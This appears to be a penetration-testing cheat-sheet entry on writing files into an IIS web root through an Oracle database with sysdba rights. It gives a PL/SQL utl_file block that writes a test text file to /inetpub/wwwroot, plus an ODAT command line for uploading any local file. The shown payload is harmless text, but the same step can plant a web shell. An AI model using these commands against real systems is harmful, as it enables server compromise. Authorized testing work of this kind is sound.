# Upload file to IIS web server via oracle DB (sysdba priv required)

## Manually

```
declare
  f utl_file.file_type;
  s varchar(4000) := 'luks was here!';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'luks.txt', 'W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
end;

---

After that apply the changes with /
```

## Auto with ODAT tool

```python
python3 odat.py dbmsxslprocessor -s <IP_TARGET> -d <SID> -U <USER> -P <PASSWORD> --putFile "remotePath" "remoteFile" "localFile" --sysdba
```

# Sources

ODAT - Quentin Hardy  
https://github.com/quentinhardy/odat
